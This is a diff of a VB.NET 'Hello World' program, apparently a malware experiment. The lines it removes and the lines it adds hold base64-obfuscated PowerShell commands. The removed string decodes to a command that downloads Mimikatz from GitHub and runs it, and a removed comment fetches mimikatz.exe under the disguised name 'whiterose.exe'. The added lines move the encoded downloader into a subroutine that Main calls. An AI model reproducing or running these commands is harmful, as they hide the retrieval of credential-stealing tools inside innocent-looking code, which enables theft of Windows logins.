@@ -4,24 +4,13 @@ Module Program
     Sub Main(args As String())
         Console.WriteLine("Hello World!")
 
-        Dim prueba = "Esto es una prueba"
-
-        Dim test = "SG9sYSBxdWUgdGFs"
-        Dim saluda = db64(test)
-        Console.WriteLine(saluda)
-
-        Dim elliot = "cG93ZXJzaGVsbCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nICgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9tYXN0ZXIvRXhmaWx0cmF0aW9uL0ludm9rZS1NaW1pa2F0ei5wczEnKTtJbnZva2UtTWltaWthdHoiIA=="
-
-        Console.WriteLine(db64(elliot))
+        mrrobot()
 
     End Sub
 
     Sub mrrobot()
 
-        'Decode Base64
-        'powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -OutFile 'whiterose.exe' -useb 'https://raw.githubusercontent.com/ParrotSec/mimikatz/master/Win32/mimikatz.exe'"
-
-        vba show a
+        Dim elliot = "cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgdW5yZXN0cmljdGVkIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyBJbnZva2UtV2ViUmVxdWVzdCAtT3V0RmlsZSAnd2hpdGVyb3NlLmV4ZScgLXVzZWIgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QYXJyb3RTZWMvbWltaWthdHovbWFzdGVyL1dpbjMyL21pbWlrYXR6LmV4ZSci"
 
     End Sub
 
